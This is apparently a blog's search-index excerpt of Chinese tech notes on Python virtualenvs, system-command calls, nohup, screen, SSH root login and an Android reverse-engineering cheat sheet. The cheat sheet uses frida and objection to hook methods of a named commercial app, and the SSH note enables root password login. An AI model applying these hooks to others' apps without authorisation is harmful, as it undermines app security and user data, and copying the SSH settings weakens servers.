class="language-bash">env_name为你要创建的虚拟环境的名字，需要联网</span></span><br></pre></td></tr></table></figure><ul><li>创建指定python版本的虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkvirtualenv -p /usr/bin/python3 spider_py38</span><br><span class="line">mkvirtualenv -p /usr/bin/python2 spider_py27</span><br></pre></td></tr></table></figure><ul><li>查看安装的所有虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure><ul><li>进入虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">workon env_nam</span><br></pre></td></tr></table></figure><ul><li>退出虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><ul><li>删除虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rmvirtualenv env_nam</span><br></pre></td></tr></table></figure><h3 id="5、virtualenv的使用"><a href="#5、virtualenv的使用" class="headerlink" title="5、virtualenv的使用"></a>5、virtualenv的使用</h3><ul><li>安装</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip3 install virtualenv</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">测试安装</span></span><br><span class="line">virtualenv --version</span><br></pre></td></tr></table></figure><ul><li>创建虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">指定python版本的虚拟环境</span></span><br><span class="line">mkvirtualenv -p /usr/bin/python3 spider_py38</span><br></pre></td></tr></table></figure><ul><li>激活虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">source spider_py38/bin/activate</span><br></pre></td></tr></table></figure><ul><li>关闭虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No111：Python虚拟环境-Windows10</title>
      <link href="/posts/4249b2d5.html"/>
      <url>/posts/4249b2d5.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、系统环境"><a href="#1、系统环境" class="headerlink" title="1、系统环境"></a>1、系统环境</h3><p>Windows10</p><h3 id="2、安装虚拟环境"><a href="#2、安装虚拟环境" class="headerlink" title="2、安装虚拟环境"></a>2、安装虚拟环境</h3><ul><li>升级pip</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure><ul><li>安装虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install virtualenv==20.16.6</span><br><span class="line">pip install virtualenvwrapper-win==1.2.7</span><br></pre></td></tr></table></figure><p>virtualenvwrapper是virtualenv的扩展管理包，可以将所有的虚拟环境整合在一个目录下。</p><h3 id="3、配置虚拟环境"><a href="#3、配置虚拟环境" class="headerlink" title="3、配置虚拟环境"></a>3、配置虚拟环境</h3><p>默认创建的虚拟环境的路径在C:\Users\Administrator\Envs</p><h3 id="4、虚拟环境操作"><a href="#4、虚拟环境操作" class="headerlink" title="4、虚拟环境操作"></a>4、虚拟环境操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkvirtualenv env_name</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">env_name为你要创建的虚拟环境的名字，需要联网</span></span><br></pre></td></tr></table></figure><ul><li>创建指定python版本的虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkvirtualenv --python=python3安装路径 env_name</span><br><span class="line">mkvirtualenv --python=C:\Users\Administrator\AppData\Local\Programs\Python\Python38\python.exe spider_py38</span><br></pre></td></tr></table></figure><ul><li>查看安装的所有虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">workon</span><br></pre></td></tr></table></figure><ul><li>进入虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">workon env_nam</span><br></pre></td></tr></table></figure><ul><li>退出虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">deactivate</span><br></pre></td></tr></table></figure><ul><li>删除虚拟环境</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rmvirtualenv env_nam</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No110：Python的四种执行系统命令的方法</title>
      <link href="/posts/79a6ecb3.html"/>
      <url>/posts/79a6ecb3.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、os-system-cmd"><a href="#1、os-system-cmd" class="headerlink" title="1、os.system(cmd)"></a>1、os.system(cmd)</h3><p>在子终端运行系统命令，可以获取命令执行后的返回信息以及执行返回的状态</p><p>执行后返回两行结果，第一行是结果，第二行是执行状态信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&quot;date&quot;</span>)</span><br><span class="line"><span class="comment"># 2018年 4月 8日 星期日 19时29分13秒 CST</span></span><br><span class="line"><span class="comment"># 运行状态号，0表示正确</span></span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2、os-popen-cmd"><a href="#2、os-popen-cmd" class="headerlink" title="2、os.popen(cmd)"></a>2、os.popen(cmd)</h3><p>不仅执行命令而且返回执行后的信息对象(常用于需要获取执行命令后的返回信息)，是通过一个管道文件将结果返回</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">nowtime = os.popen(<span class="string">&quot;date&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(nowtime.read())</span><br><span class="line"><span class="comment"># 2018年 4月 8日 星期日 19时30分35秒 CST</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3、commands模块-被subprocess取代"><a href="#3、commands模块-被subprocess取代" class="headerlink" title="3、commands模块(被subprocess取代)"></a>3、commands模块(被subprocess取代)</h3><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getoutput</td><td>获取执行命令后的返回信息</td></tr><tr><td>getstatus</td><td>获取执行命令的状态值(执行命令成功返回数值0，否则返回非0)</td></tr><tr><td>getstatusoutput</td><td>获取执行命令的状态值以及返回信息</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> commonds</span><br><span class="line"></span><br><span class="line">status, output = commands.getstatusoutput(<span class="string">&quot;date&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(status)</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="comment"># 0</span></span><br><span class="line"><span class="comment"># 2018年 4月 8日 星期日 19时31分45秒 CST</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4、subprocess模块"><a href="#4、subprocess模块" class="headerlink" title="4、subprocess模块"></a>4、subprocess模块</h3><p>运用对线程的控制和监控，将返回的结果赋于一变量，便于程序的处理。</p><p>有丰富的参数可以进行配置，可供我们自定义的选项多，灵活性高。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">nowtime = subprocess.Popen(</span><br><span class="line">        <span class="string">&quot;date&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(nowtime.stdout.read())</span><br><span class="line"><span class="comment"># 2018年 4月 8日 星期日 19时32分41秒 CST</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No109：连接云服务器时用root用户登陆</title>
      <link href="/posts/8ced7f6a.html"/>
      <url>/posts/8ced7f6a.html</url>
      
        <content type="html"><![CDATA[<ul><li>切换到root用户</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -i</span><br></pre></td></tr></table></figure><ul><li>修改SSH配置文件</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认为no，需要root用户登陆改为<span class="built_in">yes</span></span></span><br><span class="line">PermitRootLogin yes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认为no，需要root用户密码登陆改为<span class="built_in">yes</span></span></span><br><span class="line">PasswordAuthentication yes</span><br></pre></td></tr></table></figure><ul><li>给root用户设置密码</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd root</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">输入两遍新密码</span></span><br></pre></td></tr></table></figure><ul><li>重启SSH服务使修改生效</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Centos7</span></span><br><span class="line">systemctl restart sshd.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu</span></span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure><ul><li>SSH服务基本操作</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">CentOS</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看服务</span></span><br><span class="line">systemctl status sshd.service</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">systemctl start sshd.service</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭服务</span></span><br><span class="line">systemctl stop sshd.service</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">systemctl restart sshd.service</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开机自启</span></span><br><span class="line">systemctl enable sshd.service</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Ubuntu</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看服务</span></span><br><span class="line">sudo service ssh status</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动服务</span></span><br><span class="line">sudo service ssh start</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭服务</span></span><br><span class="line">sudo service ssh stop</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">重启服务</span></span><br><span class="line">sudo service ssh restart</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No108：Nohup命令详解</title>
      <link href="/posts/bea49731.html"/>
      <url>/posts/bea49731.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><ol><li><p>nohup命令运行由Command参数和任何相关的Arg参数指定的命令，忽略所有挂断（SIGHUP）信号。</p><p>在注销后使用nohup命令运行后台中的程序。要运行后台中的nohup命令，添加&amp;（表示“and”的符号）到命令的尾部。</p></li><li><p>nohup是no hang up的缩写，就是不挂断的意思。</p></li><li><p>nohup命令：如果你正在运行一个进程，而且你觉得在退出帐户时该进程还不会结束，那么可以使用nohup命令。该命令可以在你退出帐户&#x2F;关闭终端之后继续运行相应的进程。</p></li><li><p>在缺省情况下该作业的所有输出都被重定向到一个名为nohup.out的文件中。</p></li></ol><h3 id="2、语法"><a href="#2、语法" class="headerlink" title="2、语法"></a>2、语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup command &gt; myout.file 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure><p>在上面的例子中，0 – stdin (standard input)，1 – stdout (standard output)，2 – stderr (standard error) ；</p><p>2&gt;&amp;1是将标准错误（2）重定向到标准输出（&amp;1），标准输出（&amp;1）再被重定向输入到myout.file文件中。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0 22 * * * /usr/bin/python /home/test.py &gt; /home/test.log 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p>这是放在crontab中的定时任务，晚上22点时候怕这个任务，启动这个python的脚本，并把日志写在test.log文件中。</p><h3 id="3、nohup和-的区别"><a href="#3、nohup和-的区别" class="headerlink" title="3、nohup和&amp;的区别"></a>3、nohup和&amp;的区别</h3><ul><li>&amp;</li></ul><p>指在后台运行，但当用户推出(挂起)的时候，命令自动也跟着退出。</p><ul><li>nohup</li></ul><p>不挂断的运行，注意并没有后台运行的功能就是指，用nohup运行命令可以使命令永久的执行下去，和用户终端没有关系。</p><p>例如我们断开SSH连接都不会影响他的运行，注意了nohup没有后台运行的意思；&amp;才是后台运行。</p><ul><li>nohup COMMAND &amp;</li></ul><p>这样就能使命令永久的在后台执行。</p><h3 id="4、举例"><a href="#4、举例" class="headerlink" title="4、举例"></a>4、举例</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sh test.sh &amp;</span><br></pre></td></tr></table></figure><p>将sh test.sh任务放到后台，即使关闭xshell退出当前session依然继续运行，但标准输出和标准错误信息会丢失（缺少的日志的输出）。将sh<br>test.sh任务放到后台，关闭xshell，对应的任务也跟着停止。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup sh test.sh</span><br></pre></td></tr></table></figure><p>将sh test.sh任务放到后台，关闭标准输入，终端不再能够接收任何输入（标准输入），重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nohup sh test.sh &amp;</span><br></pre></td></tr></table></figure><p>将sh test.sh任务放到后台，但是依然可以使用标准输入，终端能够接收任何输入，重定向标准输出和标准错误到当前目录下的nohup.out文件，即使关闭xshell退出当前session依然继续运行。</p>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No107：Screen命令详解</title>
      <link href="/posts/69d551fe.html"/>
      <url>/posts/69d551fe.html</url>
      
        <content type="html"><![CDATA[<h3 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h3><p>Screen是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。</p><p>GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。</p><p>在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。</p><h3 id="2、语法"><a href="#2、语法" class="headerlink" title="2、语法"></a>2、语法</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$</span><span class="language-bash">&gt; screen [-AmRvx -<span class="built_in">ls</span> -wipe][-d &lt;作业名称&gt;][-h &lt;行数&gt;][-r &lt;作业名称&gt;][-s ][-S &lt;作业名称&gt;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>参数说明</th></tr></thead><tbody><tr><td>-A</td><td>将所有的视窗都调整为目前终端机的大小。</td></tr><tr><td>-d</td><td>&lt;作业名称&gt; 将指定的screen作业离线。</td></tr><tr><td>-h</td><td>&lt;行数&gt; 指定视窗的缓冲区行数。</td></tr><tr><td>-m</td><td>即使目前已在作业中的screen作业，仍强制建立新的screen作业。</td></tr><tr><td>-r</td><td>&lt;作业名称&gt; 恢复离线的screen作业。</td></tr><tr><td>-R</td><td>先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。</td></tr><tr><td>-s</td><td>指定建立新视窗时，所要执行的shell。</td></tr><tr><td>-S</td><td>&lt;作业名称&gt; 指定screen作业的名称。</td></tr><tr><td>-v</td><td>显示版本信息。</td></tr><tr><td>-x</td><td>恢复之前离线的screen作业。</td></tr><tr><td>-ls或–list</td><td>显示目前所有的screen作业。</td></tr><tr><td>-wipe</td><td>检查目前所有的screen作业，并删除已经无法使用的screen作业。</td></tr></tbody></table><h3 id="3、常用screen参数"><a href="#3、常用screen参数" class="headerlink" title="3、常用screen参数"></a>3、常用screen参数</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">screen -S yourname      -&gt; 新建一个叫yourname的session</span><br><span class="line">screen -ls              -&gt; 列出当前所有的session</span><br><span class="line">screen -r yourname      -&gt; 回到yourname这个session</span><br><span class="line">screen -d yourname      -&gt; 远程detach某个session</span><br><span class="line">screen -d -r yourname   -&gt; 结束当前session并回到yourname这个session</span><br></pre></td></tr></table></figure><h3 id="4、常用操作"><a href="#4、常用操作" class="headerlink" title="4、常用操作"></a>4、常用操作</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">创建会话（-m强制）</span></span><br><span class="line">screen -dmS session名称</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭会话</span></span><br><span class="line">screen -X -S [session # you want to kill] quit</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看所有会话</span></span><br><span class="line">screen -ls</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">进入会话</span></span><br><span class="line">screen -r session_name</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No106：Android逆向基础操作</title>
      <link href="/posts/1e6b4841.html"/>
      <url>/posts/1e6b4841.html</url>
      
        <content type="html"><![CDATA[<h3 id="一、adb"><a href="#一、adb" class="headerlink" title="一、adb"></a>一、adb</h3><h4 id="1-连接设备"><a href="#1-连接设备" class="headerlink" title="1.连接设备"></a>1.连接设备</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">所有连接设备</span></span><br><span class="line">adb devices</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">远程连接设备</span></span><br><span class="line">adb connect 192.168.137.11:5555</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">操作指定设备</span></span><br><span class="line">adb -s 设备号 其他指令</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb -s 127.0.0.1:21503 shell</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb -s FA6AE0309067 shell</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">127.0.0.1:5555 蓝叠</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">127.0.0.1:7555 MUMU模拟器</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">127.0.0.1:62001 夜游神模拟器</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">127.0.0.1:21503 逍遥模拟器</span></span><br></pre></td></tr></table></figure><ul><li>模拟器adb连接不上解决方法：替换模拟器自带的adb</li></ul><h4 id="2-操作设备"><a href="#2-操作设备" class="headerlink" title="2.操作设备"></a>2.操作设备</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看Android处理器架构</span></span><br><span class="line">adb shell getprop ro.product.cpu.abi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装APP</span></span><br><span class="line">adb install xxx.apk</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装APP,覆盖安装</span></span><br><span class="line">adb install -r xxx.apk</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载APP</span></span><br><span class="line">adb uninstall app包名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">卸载APP,保留数据</span></span><br><span class="line">adb uninstall -k app包名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb shell cmd package uninstall -k com.tencent.mm</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传文件，电脑-&gt;手机</span></span><br><span class="line">adb push 电脑文件路径 手机路径</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb push frida-server-14.2.17-android-arm64 /data/local/tmp</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">传文件，手机-&gt;电脑</span></span><br><span class="line">adb pull 手机文件路径</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb pull /system/build.prop</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">移动文件</span></span><br><span class="line">adb shell</span><br><span class="line">mv /sdcard/Download/frida-server-14.2.17 /data/local/tmp/</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">修改文件权限</span></span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">chmod 644 /system/build.prop</span><br></pre></td></tr></table></figure><h4 id="3-操作APP"><a href="#3-操作APP" class="headerlink" title="3.操作APP"></a>3.操作APP</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">手机端安装的所有app包名</span></span><br><span class="line">adb shell pm list packages</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前包名和主Activity</span></span><br><span class="line">adb shell dumpsys window | findstr mCurrentFocus</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动APP</span></span><br><span class="line">adb shell am start 包名/主Activity</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb shell am start com.autonavi.minimap/com.autonavi.map.activity.NewMapActivity</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭App</span></span><br><span class="line">adb shell am force-stop 包名</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">adb shell am force-stop com.autonavi.minimap</span></span><br></pre></td></tr></table></figure><h3 id="二、frida"><a href="#二、frida" class="headerlink" title="二、frida"></a>二、frida</h3><h4 id="1-启动服务"><a href="#1-启动服务" class="headerlink" title="1.启动服务"></a>1.启动服务</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动frida-server(模拟器-x86架构)</span></span><br><span class="line">./data/local/tmp/frida-server-12.8.0-android-x86</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动frida-server(Pixel真机-arm64架构)</span></span><br><span class="line">./data/local/tmp/frida-server-14.2.17-android-arm64</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">转发端口</span></span><br><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">adb forward tcp:27043 tcp:27043</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动远超frida-server</span></span><br><span class="line">./data/local/tmp/frida-server-14.2.17-android-arm64 -l 0.0.0.0:12345</span><br></pre></td></tr></table></figure><h4 id="2-操作设备-1"><a href="#2-操作设备-1" class="headerlink" title="2.操作设备"></a>2.操作设备</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">所有连接设备</span></span><br><span class="line">frida-ls-devices</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印USB设备上的所有进程</span></span><br><span class="line">frida-ps -U</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印指定设备上的所有进程</span></span><br><span class="line">frida-ps -D device_id</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印远超设备上的所有进程</span></span><br><span class="line">frida-ps -H 192.168.137.11:12345</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀死USB设备上的指定进程</span></span><br><span class="line">frida-kill -U PID</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">杀死指定设备上的指定进程</span></span><br><span class="line">frida-kill -D device_id PID</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印设备上的所有应用程序</span></span><br><span class="line">frida-ps -Ua</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打印设备上的所有应用程序和对应的包名</span></span><br><span class="line">frida-ps -Uai</span><br></pre></td></tr></table></figure><h3 id="三、objection"><a href="#三、objection" class="headerlink" title="三、objection"></a>三、objection</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将objection注入应用(Attach)</span></span><br><span class="line">objection -g com.babytree.apps.pregnancy explore</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将objection注入远程应用(Attach)</span></span><br><span class="line">objection -N -h 192.168.137.11 -p 12345 -g com.babytree.apps.pregnancy explore</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将objection注入应用(Spawn),引号中的objection命令会在启动时就注入App</span></span><br><span class="line">objection -g com.babytree.apps.pregnancy explore --startup-command &quot;android hooking watch class_method com.babytree.business.common.c.b.a --dump-args --dump-backtrace --dump-return&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">当前Hook任务</span></span><br><span class="line">jobs list</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">关闭Hook任务</span></span><br><span class="line">jobs kill job_id</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看内存中加载的so</span></span><br><span class="line">memory list modules</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看so的导出函数</span></span><br><span class="line">memory list exports libssl.so</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将so的导出函数保存到json文件中</span></span><br><span class="line">memory list exports libart.so --json libart.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出内存中所有的类</span></span><br><span class="line">android hooking list classes</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">列出类中所有的方法</span></span><br><span class="line">android hooking list class_methods com.babytree.business.common.c.b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hook类</span></span><br><span class="line">android hooking watch class com.babytree.business.common.c.b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成hook类代码</span></span><br><span class="line">android hooking generate simple com.babytree.business.common.c.b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hook类的所有重载</span></span><br><span class="line">android hooking watch class_method com.babytree.business.common.c.b.$init --dump-args --dump-backtrace --dump-return</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hook方法，打印参数、调用栈、返回值</span></span><br><span class="line">android hooking watch class_method com.babytree.business.common.c.b.a --dump-args --dump-backtrace --dump-return</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">内存堆搜索类的实例</span></span><br><span class="line">android heap search instances com.babytree.business.common.c.b</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">调用实例的方法</span></span><br><span class="line">android heap execute 0x2526 a</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在内存中所有已加载的类中搜索包含特定关键词的类</span></span><br><span class="line">android hooking search classes 关键词</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">在内存中所有已加载的类的方法中搜索包含特定关键词的方法</span></span><br><span class="line">android hooking search methods 关键词</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查看当前可用的activity</span></span><br><span class="line">android hooking list activities</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">启动activity</span></span><br><span class="line">android intent launch_activity com.autonavi.map.activity.NewMapActivity</span><br></pre></td></tr></table></figure><h3 id="四、抓包"><a href="#四、抓包" class="headerlink" 